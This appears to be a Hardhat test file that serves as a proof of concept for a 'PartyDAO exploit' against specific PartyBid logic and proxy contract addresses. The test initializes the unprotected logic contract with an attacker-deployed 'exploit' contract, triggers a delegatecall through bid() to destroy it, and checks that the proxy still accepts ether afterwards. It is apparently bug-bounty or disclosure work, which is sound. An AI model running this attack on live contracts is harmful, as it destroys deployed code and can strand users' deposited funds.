const { assert } = require("chai");
const { ethers } = require("hardhat");
const PartyBidLogic = "0x18B9F4aD986A0E0777a2E1A652a4499C8EE3E077";
const PartyBidProxy = "0xc0469892ad53CBaE9C5A31196866bf0c88d802B5";

describe("PartyDAO exploit", function () {
    let partybidlogic;
    let partybidproxy;
    before(async () => {
        partybidlogic = await ethers.getContractAt("PartyBid", PartyBidLogic);
        partybidproxy = await ethers.getContractAt("PartyBid", PartyBidProxy)

        const Exploit = await ethers.getContractFactory("exploit");
        exploit = await Exploit.deploy();
        await exploit.deployed();
    });

    it("should be deployed", async function () {
        assert.notEqual(await ethers.provider.getCode(partybidlogic.address), "0x", "expected the PartyBidLogic to be deployed.");
    });

    it("should have initialized with malicious contract", async function () {
        await partybidlogic.initialize(exploit.address, exploit.address, 0, 0, "expl0it", "bug0tree");
    });  

    it("should have contributed some ether using contribute()", async function () {
        const signers = await ethers.getSigners();
        await partybidlogic.connect(signers[1]).contribute({ value: 1 });
    });    

    describe('after delegatecall using bid()', () => {
        before(async () => {
            const signers = await ethers.getSigners();
            await partybidlogic.connect(signers[1]).bid();
        });

        it("should be killed", async function () {
            assert.equal(await ethers.provider.getCode(partybidlogic.address), "0x", "expected the PartyBidLogic to be destroyed.");
        });

        it("should still be able to deposit into proxy contract with killed logic contract", async function () {
            const signers = await ethers.getSigners();
            await partybidproxy.connect(signers[1]).contribute({ value: 1 });
        }); 
    });

});
